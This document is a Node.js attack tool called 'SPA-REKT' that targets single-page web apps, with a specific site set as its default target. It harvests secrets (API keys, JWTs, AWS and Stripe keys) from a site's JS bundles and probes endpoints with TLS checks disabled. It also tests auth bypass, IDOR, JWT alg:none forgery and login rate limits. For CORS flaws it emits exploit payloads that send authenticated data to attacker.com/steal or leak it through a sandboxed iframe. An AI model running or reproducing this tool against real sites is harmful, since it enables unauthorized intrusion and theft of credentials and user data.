#!/usr/bin/env node
// language: Node.js  file: rekt.js  target: any SPA
// SPA-REKT — SPA security research framework
// ripper | endpoint-harvester | secret-extractor | vuln-scanner
// usage: node rekt.js <target-url> [options]

"use strict";
const https = require("node:https");
const http  = require("node:http");
const fs    = require("node:fs");
const path  = require("node:path");
const url   = require("node:url");
const crypto= require("node:crypto");
const { execSync, spawnSync } = require("node:child_process");

// ─── CLI ────────────────────────────────────────────────────────────────────
const ARGV = process.argv.slice(2);
const TARGET = ARGV.find(a => a.startsWith("http")) || "https://ani.pm";
const OPT = {
  out:     ARGV.find(a => a.startsWith("--out="))?.slice(6)  || `rekt-output/${new URL(TARGET).hostname}`,
  deep:    ARGV.includes("--deep"),
  vuln:    ARGV.includes("--vuln") || ARGV.includes("--all"),
  secrets: ARGV.includes("--secrets") || ARGV.includes("--all"),
  cors:    ARGV.includes("--cors") || ARGV.includes("--all"),
  auth:    ARGV.includes("--auth") || ARGV.includes("--all"),
  all:     ARGV.includes("--all"),
  threads: parseInt(ARGV.find(a => a.startsWith("--threads="))?.slice(10) || "8"),
  delay:   parseInt(ARGV.find(a => a.startsWith("--delay="))?.slice(8)    || "0"),
  ua:      ARGV.find(a => a.startsWith("--ua="))?.slice(5) ||
           "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
  cookie:  ARGV.find(a => a.startsWith("--cookie="))?.slice(9) || "",
  token:   ARGV.find(a => a.startsWith("--token="))?.slice(8) || "",
};

const BASE = new URL(TARGET);
const HOST = BASE.hostname;
const ORIGIN = BASE.origin;

fs.mkdirSync(OPT.out, { recursive: true });
fs.mkdirSync(path.join(OPT.out, "assets"), { recursive: true });

const log  = (...a) => console.log("\x1b[36m[REKT]\x1b[0m", ...a);
const warn = (...a) => console.log("\x1b[33m[WARN]\x1b[0m", ...a);
const hit  = (...a) => console.log("\x1b[32m[HIT]\x1b[0m",  ...a);
const vuln = (...a) => console.log("\x1b[31m[VULN]\x1b[0m", ...a);
const sec  = (...a) => console.log("\x1b[35m[SECRET]\x1b[0m", ...a);

const REPORT = {
  target: TARGET,
  timestamp: new Date().toISOString(),
  assets: [],
  endpoints: [],
  secrets: [],
  vulns: [],
  cors: [],
  authSurface: [],
  cookies: [],
  headers: {},
};

// ─── HTTP FETCH ──────────────────────────────────────────────────────────────
function fetch(targetUrl, opts = {}) {
  return new Promise((resolve, reject) => {
    const parsed = new URL(targetUrl);
    const mod = parsed.protocol === "https:" ? https : http;
    const reqOpts = {
      hostname: parsed.hostname,
      port:     parsed.port || (parsed.protocol === "https:" ? 443 : 80),
      path:     parsed.pathname + parsed.search,
      method:   opts.method || "GET",
      headers: {
        "User-Agent":      OPT.ua,
        "Accept":          "*/*",
        "Accept-Language": "en-US,en;q=0.9",
        "Referer":         ORIGIN + "/",
        "Origin":          ORIGIN,
        ...(OPT.cookie ? { "Cookie": OPT.cookie } : {}),
        ...(OPT.token  ? { "Authorization": `Bearer ${OPT.token}` } : {}),
        ...(opts.headers || {}),
      },
      rejectUnauthorized: false,
    };
    if (opts.body) {
      reqOpts.headers["Content-Type"]   = opts.contentType || "application/json";
      reqOpts.headers["Content-Length"] = Buffer.byteLength(opts.body);
    }
    const req = mod.request(reqOpts, res => {
      const chunks = [];
      res.on("data", c => chunks.push(c));
      res.on("end", () => resolve({
        status:  res.statusCode,
        headers: res.headers,
        body:    Buffer.concat(chunks),
        text:    Buffer.concat(chunks).toString("utf8"),
      }));
    });
    req.on("error", reject);
    if (opts.body) req.write(opts.body);
    req.setTimeout(opts.timeout || 12000, () => req.destroy(new Error("timeout")));
    req.end();
  });
}

async function fetchSafe(u, opts = {}) {
  try { return await fetch(u, opts); }
  catch (e) { return { status: 0, headers: {}, body: Buffer.alloc(0), text: "", error: e.message }; }
}

function sleep(ms) { return new Promise(r => setTimeout(r, ms)); }

async function pool(tasks, limit) {
  const results = [];
  const queue = [...tasks];
  const workers = Array.from({ length: Math.min(limit, queue.length) }, async () => {
    while (queue.length) {
      const task = queue.shift();
      results.push(await task().catch(e => ({ error: e.message })));
      if (OPT.delay) await sleep(OPT.delay);
    }
  });
  await Promise.all(workers);
  return results;
}

// ─── PHASE 1: RIPPING THE SPA SHELL ─────────────────────────────────────────
async function ripShell() {
  log(`Fetching SPA shell: ${TARGET}`);
  const res = await fetchSafe(TARGET);
  if (!res.status) { warn("Failed to fetch shell"); return null; }

  // Save raw headers
  REPORT.headers = res.headers;
  hit(`Shell: ${res.status} | ${res.body.length} bytes`);

  fs.writeFileSync(path.join(OPT.out, "index.html"), res.text);

  // Extract all asset references
  const assetRefs = [];

  // script src
  for (const m of res.text.matchAll(/src=["']([^"']+)["']/g))
    assetRefs.push(m[1]);
  // link href
  for (const m of res.text.matchAll(/href=["']([^"']+\.(?:js|css|webmanifest|json))["']/g))
    assetRefs.push(m[1]);
  // modulepreload
  for (const m of res.text.matchAll(/modulepreload[^>]+href=["']([^"']+)["']/g))
    assetRefs.push(m[1]);

  return { html: res.text, assetRefs: [...new Set(assetRefs)], headers: res.headers };
}

// ─── PHASE 2: ASSET EXTRACTION ───────────────────────────────────────────────
async function extractAssets(refs) {
  log(`Extracting ${refs.length} referenced assets...`);
  const toFetch = refs.map(ref => {
    const full = ref.startsWith("http") ? ref : (ORIGIN + (ref.startsWith("/") ? ref : "/" + ref));
    return full;
  });

  const tasks = toFetch.map(assetUrl => async () => {
    const res = await fetchSafe(assetUrl);
    if (!res.status || res.status >= 400) return { url: assetUrl, status: res.status };
    const rel = new URL(assetUrl).pathname.replace(/^\//, "");
    const dest = path.join(OPT.out, rel);
    fs.mkdirSync(path.dirname(dest), { recursive: true });
    fs.writeFileSync(dest, res.body);
    hit(`  ${res.status} ${rel} (${res.body.length}b)`);
    REPORT.assets.push({ url: assetUrl, size: res.body.length, path: dest });
    return { url: assetUrl, status: res.status, size: res.body.length };
  });

  return await pool(tasks, OPT.threads);
}

// ─── PHASE 3: JS BUNDLE DEEP-MINING ─────────────────────────────────────────
// Extract: API endpoints, auth routes, secrets, tokens, chunk maps, env vars
const ENDPOINT_PATTERNS = [
  // REST paths
  /["'`](\/api\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  /["'`](\/auth\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  /["'`](\/v[0-9]+\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  // fetch/axios calls
  /fetch\(["'`](\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  /axios\.[a-z]+\(["'`](\/[a-zA-Z0-9\-_\/?.=&%{}:]+)["'`]/g,
  // template literals with paths
  /`(\/(?:api|auth|v\d+|user|admin|internal)[^`]+)`/g,
];

const SECRET_PATTERNS = [
  { name: "API Key (generic)",      re: /(?:api[_-]?key|apikey)\s*[:=]\s*["'`]([A-Za-z0-9\-_]{16,64})["'`]/gi },
  { name: "Bearer Token",           re: /bearer\s+([A-Za-z0-9\-_.~+/]+=*)/gi },
  { name: "JWT",                    re: /eyJ[A-Za-z0-9\-_]+\.eyJ[A-Za-z0-9\-_]+\.[A-Za-z0-9\-_]+/g },
  { name: "AWS Key",                re: /AKIA[0-9A-Z]{16}/g },
  { name: "AWS Secret",             re: /(?:aws[_-]?secret|secret[_-]?access[_-]?key)\s*[:=]\s*["'`]([A-Za-z0-9/+=]{40})["'`]/gi },
  { name: "Cloudflare Token",       re: /(?:cf[_-]?token|cloudflare[_-]?token)\s*[:=]\s*["'`]([A-Za-z0-9\-_]{32,64})["'`]/gi },
  { name: "Secret/Password",        re: /(?:secret|password|passwd|pwd)\s*[:=]\s*["'`]([^"'`\s]{8,64})["'`]/gi },
  { name: "Private Key",            re: /-----BEGIN (?:RSA |EC )?PRIVATE KEY-----/g },
  { name: "Stripe Key",             re: /(?:sk|pk)_(?:live|test)_[A-Za-z0-9]{24,}/g },
  { name: "SendGrid Key",           re: /SG\.[A-Za-z0-9\-_]{22}\.[A-Za-z0-9\-_]{43}/g },
  { name: "Generic Token",          re: /(?:token|access_token|refresh_token)\s*[:=]\s*["'`]([A-Za-z0-9\-_.]{20,256})["'`]/gi },
  { name: "Hardcoded URL w/ creds", re: /https?:\/\/[^:@\s]+:[^@\s]+@[^\s"'`]+/g },
  { name: "Internal IP",            re: /\b(?:10\.|172\.1[6-9]\.|172\.2\d\.|172\.3[01]\.|192\.168\.)\d+\.\d+\b/g },
  { name: "Webhook URL",            re: /https:\/\/hooks\.[a-z]+\.[a-z]+\/[A-Za-z0-9\-_/]+/g },
  { name: "Firebase Config",        re: /firebaseConfig\s*=\s*\{[^}]+\}/gs },
  { name: "GraphQL Endpoint",       re: /["'`](https?:\/\/[^"'`]+\/graphql[^"'`]*)["'`]/gi },
  { name: "Sentry DSN",             re: /https:\/\/[a-f0-9]+@o\d+\.ingest\.sentry\.io\/\d+/g },
];

function mineBundle(content, sourceFile) {
  const found = { endpoints: [], secrets: [] };

  // Endpoints
  const allEndpoints = new Set();
  for (const re of ENDPOINT_PATTERNS) {
    re.lastIndex = 0;
    for (const m of content.matchAll(re)) {
      const ep = m[1] || m[0];
      if (ep && ep.length > 3 && ep.length < 200) allEndpoints.add(ep);
    }
  }
  for (const ep of allEndpoints) {
    found.endpoints.push({ endpoint: ep, source: path.basename(sourceFile) });
    REPORT.endpoints.push({ endpoint: ep, source: path.basename(sourceFile) });
  }

  // Secrets
  for (const { name, re } of SECRET_PATTERNS) {
    re.lastIndex = 0;
    for (const m of content.matchAll(re)) {
      const val = (m[1] || m[0]).slice(0, 120);
      const entry = { type: name, value: val, source: path.basename(sourceFile) };
      found.secrets.push(entry);
      REPORT.secrets.push(entry);
      sec(`${name}: ${val.slice(0, 60)}... [${path.basename(sourceFile)}]`);
    }
  }

  // vite chunk dep map — extract all lazy-loaded chunk filenames
  const chunkMapMatch = content.match(/__vite__mapDeps\s*=\s*\([^)]*,\s*m\s*=\s*[^,]+,\s*d\s*=\s*\([^)]+\)\s*=>\s*\[([^\]]+)\]/);
  if (chunkMapMatch) {
    const chunks = chunkMapMatch[1].match(/"([^"]+)"/g)?.map(s => s.replace(/"/g, "")) || [];
    log(`  Chunk map: ${chunks.length} lazy chunks discovered`);
    found.lazyChunks = chunks;
  }

  return found;
}

async function deepMineAllBundles() {
  log("Deep-mining all JS bundles...");
  const jsFiles = fs.readdirSync(path.join(OPT.out, "assets"))
    .filter(f => f.endsWith(".js"))
    .map(f => path.join(OPT.out, "assets", f));

  // Also mine the main index.html
  const htmlPath = path.join(OPT.out, "index.html");
  if (fs.existsSync(htmlPath)) jsFiles.push(htmlPath);

  for (const f of jsFiles) {
    try {
      const content = fs.readFileSync(f, "utf8");
      const { endpoints, secrets, lazyChunks } = mineBundle(content, f);

      // If we find lazy chunks not yet downloaded, fetch them
      if (lazyChunks && OPT.deep) {
        const newChunks = lazyChunks.filter(c => !fs.existsSync(path.join(OPT.out, c)));
        if (newChunks.length) {
          log(`  Fetching ${newChunks.length} additional lazy chunks from ${path.basename(f)}`);
          await extractAssets(newChunks.map(c => "/" + c));
          // Re-mine newly downloaded chunks
          for (const c of newChunks) {
            const cp = path.join(OPT.out, c);
            if (fs.existsSync(cp)) {
              const cc = fs.readFileSync(cp, "utf8");
              mineBundle(cc, cp);
            }
          }
        }
      }

      log(`  ${path.basename(f)}: ${endpoints.length} endpoints, ${secrets.length} secrets`);
    } catch { /* binary file, skip */ }
  }
}

// ─── PHASE 4: ENDPOINT PROBING ───────────────────────────────────────────────
async function probeEndpoints() {
  if (!OPT.vuln && !OPT.all) return;
  const unique = [...new Set(REPORT.endpoints.map(e => e.endpoint))].slice(0, 200);
  log(`Probing ${unique.length} discovered endpoints...`);

  const tasks = unique.map(ep => async () => {
    const fullUrl = ORIGIN + ep.split("{")[0]; // strip template params
    const res = await fetchSafe(fullUrl);
    if (!res.status) return;

    const entry = {
      endpoint: ep,
      url: fullUrl,
      status: res.status,
      size: res.body.length,
      contentType: res.headers["content-type"] || "",
    };

    // Interesting status codes
    if (res.status === 200) {
      hit(`  200 ${ep} (${res.body.length}b)`);
      // Try to parse as JSON
      try {
        const j = JSON.parse(res.text);
        entry.json = JSON.stringify(j).slice(0, 500);
        if (ep.includes("user") || ep.includes("profile") || ep.includes("me") || ep.includes("account")) {
          hit(`  !! Potential user data at ${ep}`);
          fs.writeFileSync(path.join(OPT.out, `probe-${ep.replace(/\//g,"-").slice(1)}.json`), res.text);
        }
      } catch {}
    } else if (res.status === 401 || res.status === 403) {
      warn(`  ${res.status} AUTH-REQUIRED ${ep}`);
      entry.authRequired = true;
    } else if (res.status === 500) {
      vuln(`  500 SERVER ERROR at ${ep} — possible unhandled exception`);
      REPORT.vulns.push({ type: "Server Error", endpoint: ep, detail: res.text.slice(0, 300) });
    }

    REPORT.authSurface.push(entry);
  });

  await pool(tasks, OPT.threads);
}

// ─── PHASE 5: CORS SCANNER ───────────────────────────────────────────────────
const CORS_ORIGINS = [
  "https://evil.com",
  "https://attacker.com",
  "null",
  `https://${HOST}.evil.com`,
  `https://evil${HOST}`,
  "http://localhost:1337",
  "https://www.google.com",
];

async function scanCORS() {
  if (!OPT.cors && !OPT.all) return;
  log("Scanning CORS misconfigurations...");

  // Test endpoints most likely to have CORS
  const targets = [
    ORIGIN + "/api/auth/me",
    ORIGIN + "/api/user",
    ORIGIN + "/api/profile",
    ORIGIN + "/auth/me",
    ORIGIN + "/api/me",
    ...REPORT.endpoints
      .filter(e => e.endpoint.includes("user") || e.endpoint.includes("auth") || e.endpoint.includes("profile"))
      .slice(0, 20)
      .map(e => ORIGIN + e.endpoint.split("{")[0]),
  ];

  for (const target of [...new Set(targets)]) {
    for (const origin of CORS_ORIGINS) {
      const res = await fetchSafe(target, {
        headers: { "Origin": origin },
      });
      const acao = res.headers["access-control-allow-origin"];
      const acac = res.headers["access-control-allow-credentials"];
      if (!acao) continue;

      if (acao === "*") {
        vuln(`CORS wildcard (*) at ${target}`);
        REPORT.cors.push({ type: "wildcard", url: target, origin, acao, acac });
      } else if (acao === origin && acac === "true") {
        vuln(`CORS origin-reflection + credentials at ${target} [${origin}]`);
        REPORT.cors.push({ type: "reflect+credentials", url: target, origin, acao, acac });
        REPORT.vulns.push({
          type: "CORS Misconfiguration — Origin Reflection with Credentials",
          severity: "CRITICAL",
          url: target,
          detail: `Server reflects arbitrary origin '${origin}' with Access-Control-Allow-Credentials: true. An attacker can read authenticated responses from any origin.`,
          exploit: `fetch("${target}",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://attacker.com/steal?d="+encodeURIComponent(d)))`,
        });
      } else if (acao === origin) {
        warn(`CORS origin-reflection (no creds) at ${target} [${origin}]`);
        REPORT.cors.push({ type: "reflect", url: target, origin, acao, acac });
      }

      // null origin bypass
      if (origin === "null" && acao === "null") {
        vuln(`CORS null origin accepted at ${target}`);
        REPORT.cors.push({ type: "null-origin", url: target, acao, acac });
        REPORT.vulns.push({
          type: "CORS Null Origin Bypass",
          severity: "HIGH",
          url: target,
          detail: "Server accepts null Origin. Exploitable via sandboxed iframe.",
          exploit: `<iframe sandbox="allow-scripts" srcdoc='<script>fetch("${target}",{credentials:"include"}).then(r=>r.text()).then(d=>top.postMessage(d,"*"))</script>'></iframe>`,
        });
      }
    }
  }
}

// ─── PHASE 6: AUTH SURFACE SCANNER ───────────────────────────────────────────
async function scanAuth() {
  if (!OPT.auth && !OPT.all) return;
  log("Scanning authentication surface...");

  // Common auth endpoints to probe
  const authEndpoints = [
    "/api/auth/me", "/api/me", "/auth/me",
    "/api/user", "/api/users/me", "/api/account",
    "/api/admin", "/api/admin/users", "/api/internal",
    "/api/settings", "/api/config",
    // Add discovered auth endpoints
    ...REPORT.endpoints
      .filter(e => /auth|login|register|signup|token|session|password|reset|forgot/i.test(e.endpoint))
      .map(e => e.endpoint.split("{")[0]),
  ];

  for (const ep of [...new Set(authEndpoints)]) {
    const u = ORIGIN + ep;

    // 1. Unauthenticated GET
    const unauth = await fetchSafe(u);
    if (unauth.status === 200) {
      vuln(`AUTH BYPASS? ${ep} returns 200 without auth`);
      REPORT.vulns.push({ type: "Potential Auth Bypass", severity: "HIGH", endpoint: ep, status: 200, body: unauth.text.slice(0, 300) });
    }

    // 2. HTTP verb tampering
    for (const method of ["POST", "PUT", "DELETE", "PATCH", "OPTIONS", "HEAD"]) {
      const r = await fetchSafe(u, { method });
      if (r.status === 200 || r.status === 201) {
        warn(`  ${method} ${ep} → ${r.status}`);
        REPORT.vulns.push({ type: "HTTP Method Allowed", severity: "MEDIUM", endpoint: ep, method, status: r.status });
      }
      if (r.status === 0) continue; // timeout
    }

    // 3. Check for IDOR potential on numeric IDs
    if (/\/\d+/.test(ep)) {
      const r1 = await fetchSafe(ORIGIN + ep.replace(/\/\d+/, "/1"));
      const r2 = await fetchSafe(ORIGIN + ep.replace(/\/\d+/, "/2"));
      if (r1.status === 200 && r2.status === 200) {
        warn(`  IDOR candidate: ${ep} — both /1 and /2 accessible`);
        REPORT.vulns.push({ type: "Potential IDOR", severity: "HIGH", endpoint: ep });
      }
    }

    // 4. JWT none-algorithm / weak secret test
    if (OPT.token) {
      const parts = OPT.token.split(".");
      if (parts.length === 3) {
        // Try alg:none
        const noneHeader = Buffer.from(JSON.stringify({ alg: "none", typ: "JWT" })).toString("base64url");
        const payload = parts[1];
        const noneToken = `${noneHeader}.${payload}.`;
        const rNone = await fetchSafe(u, { headers: { "Authorization": `Bearer ${noneToken}` } });
        if (rNone.status === 200) {
          vuln(`JWT none-algorithm accepted at ${ep}`);
          REPORT.vulns.push({ type: "JWT None Algorithm", severity: "CRITICAL", endpoint: ep });
        }
      }
    }
  }

  // 5. Password reset flow analysis
  const resetEndpoints = REPORT.endpoints.filter(e => /reset|forgot|recover/i.test(e.endpoint));
  for (const { endpoint } of resetEndpoints) {
    warn(`  Password reset endpoint: ${endpoint}`);
    REPORT.authSurface.push({ type: "password-reset", endpoint });
  }
}

// ─── PHASE 7: SECURITY HEADER AUDIT ─────────────────────────────────────────
function auditHeaders(headers) {
  log("Auditing security headers...");
  const checks = [
    ["x-frame-options",               "Clickjacking protection missing"],
    ["x-content-type-options",        "MIME-sniffing protection missing (X-Content-Type-Options)"],
    ["strict-transport-security",     "HSTS not set"],
    ["content-security-policy",       "No CSP — XSS risk"],
    ["x-xss-protection",              "Legacy XSS filter not set"],
    ["referrer-policy",               "Referrer-Policy not set"],
    ["permissions-policy",            "Permissions-Policy not set"],
  ];
  for (const [h, msg] of checks) {
    if (!headers[h]) {
      warn(`  ${msg}`);
      REPORT.vulns.push({ type: "Missing Security Header", severity: "LOW", header: h, detail: msg });
    }
  }

  // Server disclosure
  if (headers.server) {
    warn(`  Server header disclosed: ${headers.server}`);
    REPORT.vulns.push({ type: "Server Version Disclosure", severity: "INFO", detail: headers.server });
  }
  if (headers["x-powered-by"]) {
    warn(`  X-Powered-By disclosed: ${headers["x-powered-by"]}`);
    REPORT.vulns.push({ type: "Tech Stack Disclosure", severity: "INFO", detail: headers["x-powered-by"] });
  }

  // Check for cookie security
  const setCookie = headers["set-cookie"];
  if (setCookie) {
    const cookies = Array.isArray(setCookie) ? setCookie : [setCookie];
    for (const c of cookies) {
      const entry = { raw: c };
      if (!/HttpOnly/i.test(c)) {
        vuln(`  Cookie without HttpOnly: ${c.split(";")[0]}`);
        REPORT.vulns.push({ type: "Cookie Missing HttpOnly", severity: "MEDIUM", detail: c.slice(0, 100) });
      }
      if (!/Secure/i.test(c)) {
        warn(`  Cookie without Secure flag: ${c.split(";")[0]}`);
        REPORT.vulns.push({ type: "Cookie Missing Secure Flag", severity: "MEDIUM", detail: c.slice(0, 100) });
      }
      if (!/SameSite/i.test(c)) {
        warn(`  Cookie without SameSite: ${c.split(";")[0]} — CSRF risk`);
        REPORT.vulns.push({ type: "Cookie Missing SameSite — CSRF Risk", severity: "MEDIUM", detail: c.slice(0, 100) });
      }
      REPORT.cookies.push(entry);
    }
  }
}

// ─── PHASE 8: RATE-LIMIT PROBE ───────────────────────────────────────────────
async function probeRateLimit() {
  if (!OPT.all) return;
  log("Probing rate limiting on auth endpoints...");
  const loginEp = REPORT.endpoints.find(e => /login|signin/.test(e.endpoint));
  if (!loginEp) { warn("  No login endpoint found in bundles"); return; }

  const u = ORIGIN + loginEp.endpoint;
  let hits429 = 0;
  for (let i = 0; i < 20; i++) {
    const r = await fetchSafe(u, {
      method: "POST",
      body: JSON.stringify({ email: `test${i}@evil.com`, password: "wrongpassword" }),
      contentType: "application/json",
    });
    if (r.status === 429) { hits429++; break; }
    if (r.status === 200 || r.status === 400) continue;
  }
  if (hits429 === 0) {
    vuln(`No rate limit detected on ${loginEp.endpoint} after 20 requests`);
    REPORT.vulns.push({ type: "No Rate Limiting on Auth Endpoint", severity: "HIGH", endpoint: loginEp.endpoint });
  } else {
    hit(`Rate limit active on ${loginEp.endpoint}`);
  }
}

// ─── PHASE 9: REPORT ─────────────────────────────────────────────────────────
function writeReport() {
  const jsonPath = path.join(OPT.out, "rekt-report.json");
  fs.writeFileSync(jsonPath, JSON.stringify(REPORT, null, 2));
  log(`Full JSON report: ${jsonPath}`);

  // Markdown summary
  const md = [
    `# SPA-REKT Report — ${HOST}`,
    `**Target:** ${TARGET}  `,
    `**Scan time:** ${REPORT.timestamp}`,
    "",
    `## Summary`,
    `| Category | Count |`,
    `|---|---|`,
    `| Assets ripped | ${REPORT.assets.length} |`,
    `| Endpoints discovered | ${[...new Set(REPORT.endpoints.map(e=>e.endpoint))].length} |`,
    `| Secrets found | ${REPORT.secrets.length} |`,
    `| Vulnerabilities | ${REPORT.vulns.length} |`,
    `| CORS issues | ${REPORT.cors.length} |`,
    "",
    `## Vulnerabilities`,
    ...REPORT.vulns.map(v =>
      `### ${v.type} (${v.severity || "?"})\n${v.detail || ""}\n${v.exploit ? "**Exploit:** \`" + v.exploit + "\`" : ""}`
    ),
    "",
    `## Secrets`,
    ...REPORT.secrets.map(s => `- **${s.type}** in \`${s.source}\`: \`${s.value.slice(0,80)}\``),
    "",
    `## Discovered Endpoints (${[...new Set(REPORT.endpoints.map(e=>e.endpoint))].length})`,
    ...[...new Set(REPORT.endpoints.map(e=>e.endpoint))].map(e => `- \`${e}\``),
  ].join("\n");

  const mdPath = path.join(OPT.out, "rekt-report.md");
  fs.writeFileSync(mdPath, md);
  log(`Markdown report: ${mdPath}`);

  // Print stats
  console.log("\n\x1b[32m╔══════════════════════════════╗\x1b[0m");
  console.log("\x1b[32m║       SPA-REKT COMPLETE       ║\x1b[0m");
  console.log("\x1b[32m╚══════════════════════════════╝\x1b[0m");
  console.log(`  Target:      ${TARGET}`);
  console.log(`  Assets:      ${REPORT.assets.length}`);
  console.log(`  Endpoints:   ${[...new Set(REPORT.endpoints.map(e=>e.endpoint))].length}`);
  console.log(`  Secrets:     ${REPORT.secrets.length}`);
  console.log(`  Vulns:       ${REPORT.vulns.length}`);
  console.log(`  CORS issues: ${REPORT.cors.length}`);
  console.log(`  Output:      ${OPT.out}/`);
}

// ─── MAIN ────────────────────────────────────────────────────────────────────
(async () => {
  console.log("\x1b[31m");
  console.log("  ███████╗██████╗  █████╗       ██████╗ ███████╗██╗  ██╗████████╗");
  console.log("  ██╔════╝██╔══██╗██╔══██╗      ██╔══██╗██╔════╝██║ ██╔╝╚══██╔══╝");
  console.log("  ███████╗██████╔╝███████║█████╗██████╔╝█████╗  █████╔╝    ██║   ");
  console.log("  ╚════██║██╔═══╝ ██╔══██║╚════╝██╔══██╗██╔══╝  ██╔═██╗   ██║   ");
  console.log("  ███████║██║     ██║  ██║      ██║  ██║███████╗██║  ██╗  ██║   ");
  console.log("  ╚══════╝╚═╝     ╚═╝  ╚═╝      ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝  ╚═╝   ");
  console.log("\x1b[0m");
  console.log(`  SPA Security Research Framework`);
  console.log(`  Target: \x1b[33m${TARGET}\x1b[0m`);
  console.log(`  Mode:   ${OPT.all ? "--all" : [OPT.deep?"deep":"",OPT.vuln?"vuln":"",OPT.secrets?"secrets":"",OPT.cors?"cors":"",OPT.auth?"auth":""].filter(Boolean).join(",") || "rip-only"}`);
  console.log(`  Output: ${OPT.out}/\n`);

  try {
    // Phase 1 — shell
    const shell = await ripShell();
    if (!shell) process.exit(1);

    // Audit headers immediately
    auditHeaders(shell.headers);

    // Phase 2 — assets
    await extractAssets(shell.assetRefs);

    // Phase 3 — deep mine all bundles
    await deepMineAllBundles();

    // Phase 4 — probe endpoints
    await probeEndpoints();

    // Phase 5 — CORS
    await scanCORS();

    // Phase 6 — auth
    await scanAuth();

    // Phase 7 — rate limit
    await probeRateLimit();

    // Phase 8 — report
    writeReport();

  } catch (e) {
    console.error("\x1b[31m[FATAL]\x1b[0m", e.message);
    process.exit(1);
  }
})();
